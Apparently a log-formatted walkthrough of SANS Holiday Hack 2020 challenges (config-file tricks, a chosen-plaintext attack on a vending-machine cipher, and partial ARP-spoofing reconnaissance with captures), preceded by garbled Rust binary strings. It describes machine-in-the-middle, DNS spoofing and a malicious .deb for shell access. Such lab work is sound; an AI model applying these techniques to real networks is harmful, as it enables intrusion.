                \x__rust_begin_short_backtrace/usr/src/rustc-1.41.1/src/libcore/str/pattern.rsformatter errorfailed to write whole bufferRUST_BACKTRACE0note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.
                <unknown>.memory allocation of  bytes failed
                attempt to calculate the remainder with a divisor of zerosrc/libstd/sys/unix/thread.rscalled `Result::unwrap()` on an `Err` valuesrc/libstd/sys/unix/os.rsstrerror_r failure`/proc/self/exeno /proc/self/exe available. Is /proc mounted?rwlock maximum reader count exceededrwlock read lock would result in deadlockthread panicked while panicking. aborting.
                <unnamed>note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace.
                ' panicked at '', 
                thread panicked while processing panic. aborting.
                src/libstd/sys/unix/rwlock.rsassertion failed: `(left == right)`
                  left: ``,
                 right: `urn:uuid:called `Option::unwrap()` on a `None` value
                0123456789abcdefABCDEF-/root/.cargo/registry/src/github.com-1ecc6299db9ec823/uuid-0.8.1/src/parser/mod.rs/usr/src/rustc-1.41.1/src/libcore/macros/mod.rsinvalid group lengthinvalid number of groupsinvalid characterinvalid length an optional prefix of `urn:uuid:` followed byexpected  in group one of  : invalid bytes length: expected /proc/curproc/file
                /proc/self/exe
                /proc/%ld/object/a.out
                failed to read executable information
                libbacktrace could not find executable to open
                close
                backtrace library does not support threads
                no debug info in ELF executable
                no symbol table in ELF executable
                .debug_info
                executable file is not ELF
                ELF section name out of range
                .note.gnu.build-id
                .gnu_debuglink
                .opd
                /usr/lib/debug/.build-id/
                .debug/
                /usr/lib/debug/
                fstat
                executable file is unrecognized ELF version
                executable file is unexpected ELF class
                executable file has unknown endianness
                ELF symbol table strtab link out of range
                symbol string index out of range
                 n;^
                Qkkbal
                .data
                .bss
                .comment
            
2020-12-31 18:17:23.473 +00:00 [VRB] Challenge SpeakerDoorOpen completed
2020-12-31 18:17:23.474 +00:00 [VRB] Running challange SpeakerLightsOn
2020-12-31 18:17:23.476 +00:00 [INF] ---t is ---t?, hin--- is hin---

                The speaker unpreparedness room sure is dark, you're thinking (assuming
                you've opened the door; otherwise, you wonder how dark it actually is)

                You wonder how to turn the lights on? If only you had some kind of hin---

                    >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lights.conf

                ---t to help figure out the password... I guess you'll just have to make do!

                The terminal just blinks: Welcome back, elf-technician

                What do you enter? > light
                Checking......
                Beep boop invalid password
            
2020-12-31 18:17:23.505 +00:00 [INF] cat /home/elf/lights.conf

                password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
                name: elf-technician
            
2020-12-31 18:17:23.507 +00:00 [INF] Removed one character from the password.

                Failed to parse key `password`: OddLength
                Password is missing from config file!
            
2020-12-31 18:17:23.508 +00:00 [INF] Remove entire password
Couldn't read config file: Badly formatted line (expected: "key: value"): 
2020-12-31 18:17:23.509 +00:00 [INF] Rename elf-technician to E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 in ./lab/lights.conf to get Computer-TurnLightsOn

                elf@0e91ec090c86 ~/lab $ vi lights.conf 
                elf@0e91ec090c86 ~/lab $ ./lights       
                The speaker unpreparedness room sure is dark, you're thinking (assuming
                you've opened the door; otherwise, you wonder how dark it actually is)

                You wonder how to turn the lights on? If only you had some kind of hin---

                 >>> CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lab/lights.conf

                ---t to help figure out the password... I guess you'll just have to make do!

                The terminal just blinks: Welcome back, Computer-TurnLightsOn

                What do you enter? > ^C
                elf@0e91ec090c86 ~/lab $ cat ./lights.conf 
                password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
                name: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
                elf@0e91ec090c86 ~/lab $ 
            
2020-12-31 18:17:23.543 +00:00 [VRB] Challenge SpeakerLightsOn completed
2020-12-31 18:17:23.545 +00:00 [VRB] Running challange SpeakerVendingMachineOn
2020-12-31 18:17:23.582 +00:00 [INF] Goto lab directory, delete vending-machines.json

                cd lab/
                rm vending-machines.json
                ./vending-machines                
                
            
2020-12-31 18:17:23.585 +00:00 [INF] We can run ./vending-machines, provide new password and then see how it looks like in the json file.
                
                The elves are hungry!

                If the door's still closed or the lights are still off, you know because
                you can hear them complaining about the turned-off vending machines!
                You can probably make some friends if you can get them back on...

                Loading configuration from: /home/elf/lab/vending-machines.json

                I wonder what would happen if it couldn't find its config file? Maybe that's
                something you could figure out in the lab...

                ALERT! ALERT! Configuration file is missing! New Configuration File Creator Activated!

                Please enter the name >     
                Please enter the password > AAAAAAAAAAAAAAAAAAAAAAAA

                Welcome, ! It looks like you want to turn the vending machines back on?
                Please enter the vending-machine-back-on code > AAAAAAAAAAAAAAAAAAAAAAAA
                Checking......
                That would have enabled the vending machines!

                If you have the real password, be sure to run /home/elf/vending-machines
                elf@aa086c750649 ~/lab $ cat ./vending-machines.json 
                {
                  "name": "",
                  "password": "XiGRehmwXiGRehmwXiGRehmw"
                }
                elf @aa086c750649 ~/lab $             
            
2020-12-31 18:17:23.633 +00:00 [INF] Trying single letter... and viola first letter matches... 

                Please enter the password > C

                Welcome, ! It looks like you want to turn the vending machines back on?
                Please enter the vending-machine-back-on code > 
                Checking......
                Beep boop invalid password
                elf@aa086c750649 ~/lab $ cat vending-machines.json 
                {
                    "name": "",
                    "password": "L"
                }
            
2020-12-31 18:17:23.702 +00:00 [INF] This is password we are looking for. cat vending-machines.json
                
                {
                  "name": "elf - maintenance",
                  "password": "LVEdQPpBwr"                                
               }                                                
            
2020-12-31 18:17:23.705 +00:00 [INF] Trying Candies

                Please enter the name > 
                Please enter the password > Candies    

                Welcome, ! It looks like you want to turn the vending machines back on?
                Please enter the vending-machine-back-on code > 
                Checking......
                Beep boop invalid password
                elf@aa086c750649 ~/lab $ cat vending-machines.json 
                {
                  "name": "",
                  "password": "LVEd4Yb"
                }                       
            
2020-12-31 18:17:23.733 +00:00 [INF] Trying Candyman


                Please enter the name > 
                Please enter the password > Candyman

                Welcome, ! It looks like you want to turn the vending machines back on?
                Please enter the vending-machine-back-on code > 
                Checking......
                Beep boop invalid password
                elf@aa086c750649 ~/lab $ cat vending-machines.json 
                {
                  "name": "",
                  "password": "LVEdQRpB"
                }

            
2020-12-31 18:17:23.736 +00:00 [INF] rm vending-machines.json;./vending-machines;cat vending-machines.json

                The elves are hungry!

                If the door's still closed or the lights are still off, you know because
                you can hear them complaining about the turned-off vending machines!
                You can probably make some friends if you can get them back on...

                Loading configuration from: /home/elf/lab/vending-machines.json

                I wonder what would happen if it couldn't find its config file? Maybe that's
                something you could figure out in the lab...

                ALERT! ALERT! Configuration file is missing! New Configuration File Creator Activated!

                Please enter the name > 
                Please enter the password > Candymane1

                Welcome, ! It looks like you want to turn the vending machines back on?
                Please enter the vending-machine-back-on code > 
                Checking......
                Beep boop invalid password
                {
                  "name": "",
                  "password": "LVEdQRpBwr"
                }

            
2020-12-31 18:17:23.773 +00:00 [INF] Password was found.

                LVEdQPpBwr  -- CandyCane1
                LVEdQLpBwr  -- Candy1ane1
                LVEdQbpBwr     CandyLane1
            
2020-12-31 18:17:23.775 +00:00 [INF] ./vending-machines

                The elves are hungry!

                If the door's still closed or the lights are still off, you know because
                you can hear them complaining about the turned-off vending machines!
                You can probably make some friends if you can get them back on...

                Loading configuration from: /home/elf/vending-machines.json

                I wonder what would happen if it couldn't find its config file? Maybe that's
                something you could figure out in the lab...

                Welcome, elf-maintenance! It looks like you want to turn the vending machines back on?
                Please enter the vending-machine-back-on code > CandyCane1
                Checking......

                Vending machines enabled!!
            
2020-12-31 18:17:23.810 +00:00 [VRB] Challenge SpeakerVendingMachineOn completed
2020-12-31 18:17:23.812 +00:00 [VRB] Running challange BlockchainInvestigationPart1
2020-12-31 18:17:23.842 +00:00 [INF] Prerequriemnets

                pip install --upgrade setuptools
                pip install pycrypto

            
2020-12-31 18:17:23.842 +00:00 [VRB] Challenge BlockchainInvestigationPart1 completed
2020-12-31 18:17:23.845 +00:00 [VRB] Running challange BlockchainInvestigationPart2
2020-12-31 18:17:23.846 +00:00 [VRB] Challenge BlockchainInvestigationPart2 completed
2020-12-31 18:17:23.874 +00:00 [VRB] Running challange ARPShenanigans
2020-12-31 18:17:23.878 +00:00 [INF] Objective

                Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. 
                Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. 
                Who recused herself from the vote described on the document?

            
2020-12-31 18:17:23.880 +00:00 [INF] Hints


                Spoofy
                From: Alabaster Snowball
                Objective: 9) ARP Shenanigans
                
                The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. 
                I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts.


                Resolvy
                From: Alabaster Snowball
                Objective: 9) ARP Shenanigans

                Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. 
                Let's return a DNS response resolving the request to our IP.


                Embedy
                From: Alabaster Snowball
                Objective: 9) ARP Shenanigans
                
                The malware on the host does an HTTP request for a .deb package. 
                Maybe we can get command line access by sending it a command in a customized .deb file


                Sniffy
                From: Alabaster Snowball
                Objective: 9) ARP Shenanigans
                
                Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. 
                Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host.


            
2020-12-31 18:17:23.910 +00:00 [INF] Chats


                Alabaster Snowball  8:38PM

                Oh, I see the Scapy Present Packet Prepper has already been completed!
                Now you can help me get access to this machine.
                It seems that some interloper here at the North Pole has taken control of the host.

                We need to regain access to some important documents associated with Kringle Castle.
                Maybe we should try a machine-in-the-middle attack?
            
                Oh, I see the Scapy Present Packet Prepper has already been completed!
                Now you can help me get access to this machine.

                It seems that some interloper here at the North Pole has taken control of the host.
                We need to regain access to some important documents associated with Kringle Castle.

                Maybe we should try a machine-in-the-middle attack?
                That could give us access to manipulate DNS responses.

                But we'll still need to cook up something to change the HTTP response.
            
                I'm sure glad you're here Santa.

            
2020-12-31 18:17:23.957 +00:00 [INF] Theory

                What is ARP? Address Resolution Protocol

                Address Resolution Protocol (ARP) is a procedure for mapping a dynamic Internet Protocol address (IP address) to a permanent physical machine address in a local area network (LAN). 
                The physical machine address is also known as a Media Access Control or MAC address. 


                More on: https://searchnetworking.techtarget.com/definition/Address-Resolution-Protocol-ARP

            
2020-12-31 18:17:23.992 +00:00 [INF] Getting nothing from ARP cache

                guest@505d7d82c555:~$ arp -a                
            
2020-12-31 18:17:23.992 +00:00 [INF] cat HELP.md
                
                # How To Resize and Switch Terminal Panes:
                You can use the key combinations ( Ctrl+B ↑ or ↓ ) to resize the terminals.
                You can use the key combinations ( Ctrl+B o ) to switch terminal panes.
                See tmuxcheatsheet.com for more details

                # To Add An Additional Terminal Pane:
                `/usr/bin/tmux split-window -hb`

                # To exit a terminal pane simply type:
                `exit`

                # To Launch a webserver to serve-up files/folder in a local directory:
                ```
                cd /my/directory/with/files
                python3 -m http.server 80
                ```

                # A Sample ARP pcap can be viewed at:
                https://www.cloudshark.org/captures/d97c5b81b057

                # A Sample DNS pcap can be viewed at:
                https://www.cloudshark.org/captures/0320b9b57d35

                # If Reading arp.pcap with tcpdump or tshark be sure to disable name
                # resolution or it will stall when reading:
                ```
                tshark -nnr arp.pcap
                tcpdump -nnr arp.pcap
                ```
            
2020-12-31 18:17:23.996 +00:00 [INF] ifconfig, IP 10.6.0.3 MAC 02:42:0a:06:00:03

                eth0: flags=4419<UP,BROADCAST,RUNNING,PROMISC,MULTICAST>  mtu 1500
                        inet 10.6.0.3  netmask 255.255.0.0  broadcast 10.6.255.255
                        ether 02:42:0a:06:00:03  txqueuelen 0  (Ethernet)
                        RX packets 446  bytes 19164 (19.1 KB)
                        RX errors 0  dropped 0  overruns 0  frame 0
                        TX packets 0  bytes 0 (0.0 B)
                        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

                lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
                        inet 127.0.0.1  netmask 255.0.0.0
                        loop  txqueuelen 1000  (Local Loopback)
                        RX packets 40  bytes 2000 (2.0 KB)
                        RX errors 0  dropped 0  overruns 0  frame 0
                        TX packets 40  bytes 2000 (2.0 KB)
                        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

            
2020-12-31 18:17:24.030 +00:00 [INF] tshark help

                https://www.wireshark.org/docs/man-pages/tshark.html
            
2020-12-31 18:17:24.030 +00:00 [INF] Read packets files

                guest@505d7d82c555:~/pcaps$ tshark -nnr arp.pcap
                    1   0.000000 cc:01:10:dc:00:00 → ff:ff:ff:ff:ff:ff ARP 60 Who has 10.10.10.1? Tell 10.10.10.2
                    2   0.031000 cc:00:10:dc:00:00 → cc:01:10:dc:00:00 ARP 60 10.10.10.1 is at cc:00:10:dc:00:00

                guest@505d7d82c555:~/pcaps$ tcpdump -nnr arp.pcap
                reading from file arp.pcap, link-type EN10MB (Ethernet)
                17:16:02.806447 ARP, Request who-has 10.10.10.1 tell 10.10.10.2, length 46
                17:16:02.837447 ARP, Reply 10.10.10.1 is-at cc:00:10:dc:00:00, length 46

                guest@505d7d82c555:~/pcaps$ tshark -nnr dns.pcap
                    1   0.000000 192.168.170.8 → 192.168.170.20 DNS 74 Standard query 0x75c0 A www.netbsd.org
                    2   0.048911 192.168.170.20 → 192.168.170.8 DNS 90 Standard query response 0x75c0 A www.netbsd.org A 204.152.190.12


                guest@505d7d82c555:~/pcaps$ tcpdump -nnr dns.pcap
                reading from file dns.pcap, link-type EN10MB (Ethernet)
                08:49:18.685951 IP 192.168.170.8.32795 > 192.168.170.20.53: 30144+ A? www.netbsd.org. (32)
                08:49:18.734862 IP 192.168.170.20.53 > 192.168.170.8.32795: 30144 1/0/0 A 204.152.190.12 (48)


            
2020-12-31 18:17:24.062 +00:00 [INF] tcpdump -nn

                guest@505d7d82c555:~/pcaps$ tcpdump -nn
                tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
                listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
                21:35:00.464437 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                21:35:01.508446 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                21:35:02.540369 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                21:35:03.580386 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                21:35:04.620438 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                21:35:05.652377 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28

            
2020-12-31 18:17:24.099 +00:00 [INF] When logged immediatelly run tcpdump -nni eth0. The ICMP6 does not happen later... 
                
                The MAC address 2a:27:f1:f6:e4:9d changes everytime accessing the terminal.
                Router discovery messages
                To enable router discovery, the IRDP defines two kinds of ICMP messages:[4][5]

                The ICMP Router Solicitation message is sent from a computer host to any routers on the local area network to request that they advertise their presence on the network.

            

                tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
                listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
                22:14:36.566554 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:37.345679 IP6 fe80::9822:6fff:fe7b:92de > ff02::2: ICMP6, router solicitation, length 16
                22:14:37.610555 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:38.642595 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:39.674605 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:40.782625 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:41.826849 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:42.862631 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:43.902643 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:44.938686 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:45.970638 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:46.049697 IP6 fe80::9822:6fff:fe7b:92de > ff02::2: ICMP6, router solicitation, length 16
                22:14:47.002821 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:48.038662 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:49.090932 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:50.126659 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:51.166754 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:52.206596 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:53.238806 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                22:14:54.274839 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28


            guest@1dbc829b765d:~$ tshark
            Capturing on 'eth0'
                1 0.000000000 fe80::2827:f1ff:fef6:e49d → ff02::2      ICMPv6 70 Router Solicitation from 2a:27:f1:f6:e4:9d
                2 0.161261685 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                3 1.209474837 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                4 2.244852384 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                5 3.284891781 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                6 4.324876935 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                7 5.360963713 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                8 6.396865986 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                9 7.423932814 fe80::2827:f1ff:fef6:e49d → ff02::2      ICMPv6 70 Router Solicitation from 2a:27:f1:f6:e4:9d
               10 7.437029569 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               11 8.472865340 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               12 9.504907119 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               13 10.561525306 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               14 11.592910912 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               15 12.636858756 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               16 13.689205728 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               17 14.728905098 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               18 15.772974532 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               19 16.812953139 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               20 17.852897605 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               21 18.884977571 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               22 19.928908522 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               23 20.972919679 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               24 22.008884886 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               25 22.527940896 fe80::2827:f1ff:fef6:e49d → ff02::2      ICMPv6 70 Router Solicitation from 2a:27:f1:f6:e4:9d
               26 23.065161088 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               27 24.112834401 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               28 25.152877006 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               29 26.212860899 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               30 27.252883953 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               31 28.304987317 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               32 29.352902817 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               33 30.396905879 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               34 31.441033315 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               35 32.488884888 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               36 33.532955828 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               37 34.564894101 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               38 35.612875309 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               39 36.661061380 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
               40 37.704864306 4c:24:57:ab:ed:84 → Broadcast    ARP 42 Who has 10.6.6.53? Tell 10.6.6.35


            
2020-12-31 18:17:24.298 +00:00 [INF] Found how to read specific frame: tshark -r out.pcap -Y "frame.number >= 1 && frame.number <= 10"


                1 0.000000000 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                2 1.039942918 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                3 2.091998751 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                4 3.131935943 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                5 4.199995086 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                6 5.259945568 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                7 6.303958906 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                8 7.183032133 fe80::f8f1:edff: fe60: 3c57 → ff02::2      ICMPv6 70 Router Solicitation from fa:f1: ed: 60:3c: 57
                9 7.351906056 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35
                10 8.399987293 4c: 24:57:ab: ed: 84 → Broadcast ARP 42 Who has 10.6.6.53 ? Tell 10.6.6.35

            
2020-12-31 18:17:24.351 +00:00 [INF] What do we know now...
                my ip is 10.6.0.3 with mac 02:42:0a:06:00:03
                hijacked host is at 10.6.6.35
                found ARP who-has 10.6.6.35 packets flying over the network

                For:
                    Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                We must reply: 
                    10.6.6.35 is-at 4c:24:57:ab:ed:84

                    Sender IP addres:   10.6.6.35
                    Sender MAC address: 4c:24:57:ab:ed:84



                Based on packet comparison (sniffed and the example provided in pcaps) we must reply with: 

                    Ether dst: 02:42:0a:06:00:06 
                    ARP target ip: 10.10.10.2
                    ARP sender ip: 10.6.6.53


            
              
                inet 10.6.0.3  netmask 255.255.0.0  broadcast 10.6.255.255
                Jack Frost has hijacked the host at 10.6.6.35 with some custom malware.                
                Request who-has 10.6.6.53 tell 10.6.6.35, length 28
                      
            
2020-12-31 18:17:24.432 +00:00 [INF] Get hijacked host MAC address

                guest@3fcc52341816:~$ python3
                Python 3.8.5 (default, Jul 28 2020, 12:59:40) 
                [GCC 9.3.0] on linux
                Type "help", "copyright", "credits" or "license" for more information.
                >>> from scapy.all import Ether, ARP, srp, send
                >>> srp(Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(pdst = "10.6.6.35"), timeout = 1, verbose = 0)[0][0][1].src
                '4c:24:57:ab:ed:84'

            
2020-12-31 18:17:24.461 +00:00 [INF] There are multiple ARP requests which we might have to answer, for example 10.6.6.35


                guest@d4a322bde6e4:~$ tshark -n
                Capturing on 'eth0'
                    1 0.000000000 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                    2 0.000157636 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.0.6
                    3 0.088167525 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.35? Tell 10.6.0.6
                    4 1.055984658 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                    5 2.099919201 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                    6 2.204333394 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.0.6
                    7 2.284136670 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.35? Tell 10.6.0.6
                    8 3.135988466 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                    9 4.180013747 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                   10 4.376467450 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.0.6
                   11 4.440169404 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.35? Tell 10.6.0.6
                   12 5.235964835 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                   13 6.295972797 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
                   14 6.508090208 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.0.6
                   15 6.604233788 02:42:0a:06:00:06 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.35? Tell 10.6.0.6
                   16 7.339963840 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35

                    Who has 10.6.6.35? Tell 10.6.0.6
                    Who has 10.6.6.53? Tell 10.6.6.35

            
2020-12-31 18:17:24.529 +00:00 [INF] When trying send a new packet (not completed yet) I can see DNS packages...

                 2338 2394.379999382 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2339 2395.420053549 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2340 2396.251885630     10.6.0.7 → 169.254.169.254 DNS 63 Standard query 0xeb7a A MAC                                                
                 2341 2396.319089628 02:42:0a:06:00:07 → 02:42:94:00:d2:d6 ARP 42 Who has 10.6.0.1? Tell 10.6.0.7                                     
                 2342 2396.319146187 02:42:94:00:d2:d6 → 02:42:0a:06:00:07 ARP 42 10.6.0.1 is at 02:42:94:00:d2:d6                                    
                 2343 2396.460168832 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2344 2397.508022900 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2345 2398.555955377 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35   

                 2373 2421.277998227     10.6.0.7 → 169.254.169.254 DNS 89 Standard query 0xf15a A IP.c.holidayhack2020.internal                      
                 2374 2421.636063916 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2375 2422.680070877 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2376 2423.724111830 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2377 2424.768039488 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2378 2425.807966415 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
                 2379 2426.283261025     10.6.0.7 → 169.254.169.254 DNS 89 Standard query 0xf15a A IP.c.holidayhack2020.internal                      
                 2380 2426.843980274 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35                                   
